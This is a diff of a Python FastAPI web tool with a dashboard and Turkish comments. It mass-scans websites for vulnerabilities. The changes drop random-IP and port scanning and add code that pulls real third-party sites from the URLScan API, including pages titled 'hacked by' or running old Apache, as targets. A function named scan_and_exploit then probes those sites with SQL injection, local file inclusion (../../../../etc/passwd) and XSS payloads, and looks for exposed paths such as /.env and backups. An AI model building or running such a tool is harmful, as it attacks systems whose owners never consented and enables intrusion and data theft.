@@ -1,4 +1,4 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks, Request
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 import asyncio
@@ -8,8 +8,6 @@ import urllib.parse
 import os
 import logging
 import time
-import random
-import socket
 from typing import List
 import uvicorn
 
@@ -90,12 +88,11 @@ HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 }
 
-COMMON_DIRS = ["/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php", "/.git/config"]
+COMMON_DIRS = ["/admin", "/.env", "/backup.zip", "/config.php", "/phpinfo.php"]
 SQLI_PAYLOADS = ["'", "' OR 1=1 --"]
 SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark"]
 LFI_PAYLOADS = ["../../../../etc/passwd"]
 XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"]
-COMMON_PORTS = [21, 22, 80, 443, 3306, 8080, 8443]
 
 # --- ASENKRON VERİTABANI KAYDI ---
 async def save_finding(url, vuln, payload, data):
@@ -107,39 +104,44 @@ async def save_finding(url, vuln, payload, data):
             conn.commit()
     await asyncio.to_thread(db_insert)
 
-# --- TARAMA MODÜLLERİ ---
-async def scan_ports(ip, results):
-    for port in COMMON_PORTS:
-        try:
-            fut = asyncio.open_connection(ip, port)
-            reader, writer = await asyncio.wait_for(fut, timeout=2)
-            writer.close()
-            await writer.wait_closed()
-            results.append({"type": "Port", "detail": f"Açık Port: {port}"})
-        except:
-            pass
+# --- GERÇEK HEDEF BULMA (OSINT) ---
+async def fetch_osint_targets(session, limit):
+    logger.info("Gerçek web siteleri aranıyor (URLScan API)...")
+    targets = set()
+    try:
+        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"']
+        for q in queries:
+            if len(targets) >= limit: break
+            encoded_q = urllib.parse.quote(q)
+            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size={limit}"
+            async with session.get(url, timeout=10) as res:
+                if res.status == 200:
+                    data = await res.json()
+                    for result in data.get('results', []):
+                        if len(targets) >= limit: break
+                        page_url = result.get('page', {}).get('url')
+                        if page_url and page_url.startswith("http"):
+                            targets.add(page_url)
+            await asyncio.sleep(1)
+    except Exception as e:
+        logger.error(f"OSINT Hatası: {e}")
 
+    # Rastgele IP üretimi kaldırıldı. API çökerse boş liste döner.
+    if len(targets) == 0:
+        logger.warning("API'den veri alınamadı. Hedef listesi boş.")
+            
+    return list(targets)
+
+# --- TARAMA MOTORU ---
 async def scan_and_exploit(session, target_url, config):
     report = {"target": target_url, "vulns": [], "status": "OK", "waf": False}
     
     try:
-        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=HEADERS) as response:
+        async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True, headers=HEADERS) as response:
             if response.status not in [200, 301, 302]:
                 report["status"] = f"HTTP {response.status}"
                 await manager.broadcast({"type": "scan_result", "data": report})
                 return
-
-            # WAF Tespiti
-            headers = response.headers
-            if "cloudflare" in headers.get("Server", "").lower() or "cf-ray" in headers:
-                report["waf"] = True
-
-            parsed_url = urllib.parse.urlparse(target_url)
-            ip = parsed_url.hostname
-
-            # Port Taraması
-            if config.get("ports"):
-                await scan_ports(ip, report["vulns"])
 
             # Dizin Taraması
             if config.get("dirs"):
@@ -206,19 +208,18 @@ async def run_scan_pipeline(config: dict):
     
     logger.info(f"Tarama Başlatıldı. Limit: {limit} | Threads: {threads}")
     
-    # Hedefleri topla (Basit OSINT simülasyonu)
-    targets = set()
-    while len(targets) < limit:
-        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
-        targets.add(f"http://{ip}")
-        targets.add(f"http://testphp.vulnweb.com") # Test hedefi
-    
-    targets = list(targets)[:limit]
-    
     connector = aiohttp.TCPConnector(limit=threads, limit_per_host=5, ssl=False)
     timeout = aiohttp.ClientTimeout(total=10)
     
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        targets = await fetch_osint_targets(session, limit)
+        
+        if not targets:
+            logger.warning("Taranacak hedef bulunamadı. İşlem iptal edildi.")
+            return
+            
+        logger.info(f"Toplam {len(targets)} hedef bulundu. Tarama başlıyor...")
+        
         semaphore = asyncio.Semaphore(threads)
         async def limited_scan(url):
             async with semaphore:
@@ -233,7 +234,6 @@ async def run_scan_pipeline(config: dict):
 class ScanConfig(BaseModel):
     limit: int
     threads: int
-    ports: bool
     dirs: bool
     sqli: bool
     lfi: bool
@@ -270,30 +270,21 @@ def read_root():
             }
             * { box-sizing: border-box; margin: 0; padding: 0; }
             body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; overflow: hidden; }
-            
-            /* Sidebar (Sol Panel) */
             .sidebar { width: 320px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
             .brand { padding: 20px; border-bottom: 1px solid var(--border); }
             .brand h1 { font-size: 1.2rem; font-weight: 800; color: #fff; }
             .brand p { font-size: 0.75rem; color: var(--accent); font-weight: 600; letter-spacing: 1px; }
-            
             .settings { padding: 20px; flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
             .setting-group { display: flex; flex-direction: column; gap: 5px; }
             .setting-group label { font-size: 0.8rem; color: #94a3b8; font-weight: 600; }
             .setting-group input[type="number"] { background: var(--bg); border: 1px solid var(--border); color: #fff; padding: 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; }
-            
             .checkbox-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 5px; }
             .checkbox-group label { display: flex; align-items: center; gap: 8px; font-size: 0.85rem; color: var(--text); cursor: pointer; background: var(--bg); padding: 8px; border: 1px solid var(--border); border-radius: 4px; }
             .checkbox-group input { accent-color: var(--accent); }
-            
             .btn-start { background: var(--accent); color: #fff; border: none; padding: 15px; border-radius: 6px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.2s; margin-top: 10px; }
             .btn-start:hover { background: #4f46e5; }
             .btn-start:disabled { background: #334155; cursor: not-allowed; }
-
-            /* Main Content (Sağ Panel) */
             .main-content { flex: 1; display: flex; flex-direction: column; }
-            
-            /* Stats Bar */
             .stats-bar { display: flex; background: var(--panel); border-bottom: 1px solid var(--border); padding: 15px 25px; gap: 30px; }
             .stat-item { display: flex; flex-direction: column; }
             .stat-label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; }
@@ -302,11 +293,7 @@ def read_root():
             .stat-value.vuln { color: var(--danger); }
             .stat-value.clean { color: var(--success); }
             .stat-value.error { color: var(--warning); }
-
-            /* Content Layout */
             .content-layout { display: flex; flex: 1; overflow: hidden; }
-            
-            /* Terminal (Loglar) */
             .terminal-panel { width: 35%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
             .panel-header { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.8rem; color: #94a3b8; font-weight: 600; text-transform: uppercase; display: flex; justify-content: space-between; }
             .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
@@ -315,21 +302,17 @@ def read_root():
             .log-info { color: var(--accent); }
             .log-warning { color: var(--warning); }
             .log-critical { color: var(--danger); font-weight: bold; }
-
-            /* Results Table */
             .table-panel { width: 65%; display: flex; flex-direction: column; background: var(--bg); }
             .table-container { flex: 1; overflow-y: auto; padding: 15px; }
             table { width: 100%; border-collapse: collapse; }
             th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.9rem; }
             th { background: var(--panel); color: #94a3b8; font-weight: 600; position: sticky; top: 0; z-index: 10; }
             tr:hover { background: #1e2230; }
-            
             .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
             .badge-vuln { background: rgba(239, 68, 68, 0.15); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.3); }
             .badge-clean { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
             .badge-err { background: rgba(245, 158, 11, 0.15); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.3); }
             .badge-waf { background: rgba(139, 92, 246, 0.15); color: #a78bfa; border: 1px solid rgba(139, 92, 246, 0.3); margin-left: 5px; }
-            
             .vuln-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #fca5a5; display: block; margin-top: 4px; }
             .vuln-detail span { color: #fff; }
         </style>
@@ -353,7 +336,6 @@ def read_root():
                 <div class="setting-group" style="margin-top: 10px;">
                     <label>Tarama Modülleri</label>
                     <div class="checkbox-group">
-                        <label><input type="checkbox" id="mod-ports" checked> Port Tarama</label>
                         <label><input type="checkbox" id="mod-dirs" checked> Dizin Keşfi</label>
                         <label><input type="checkbox" id="mod-sqli" checked> SQL Injection</label>
                         <label><input type="checkbox" id="mod-lfi" checked> LFI</label>
@@ -492,7 +474,6 @@ def read_root():
                 const config = {
                     limit: parseInt(document.getElementById('limit').value),
                     threads: parseInt(document.getElementById('threads').value),
-                    ports: document.getElementById('mod-ports').checked,
                     dirs: document.getElementById('mod-dirs').checked,
                     sqli: document.getElementById('mod-sqli').checked,
                     lfi: document.getElementById('mod-lfi').checked,
